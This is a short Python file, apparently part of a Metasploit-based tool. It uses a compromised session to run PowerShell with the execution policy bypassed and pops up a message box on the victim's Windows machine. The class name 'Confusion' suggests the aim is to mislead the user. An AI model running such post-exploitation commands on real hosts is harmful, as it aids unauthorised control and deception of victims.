#!/usr/bin/env python3

class Confusion():
    

    def openAlertBox(self, msfclient, sessionInput):
        msfclient.client.sessions.session('1').run_shell_cmd_with_output('@powershell.exe -ExecutionPolicy Bypass -Command \"[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [System.Windows.Forms.MessageBox]::Show(\'We are proceeding with next step.\')\"', end_strs=None)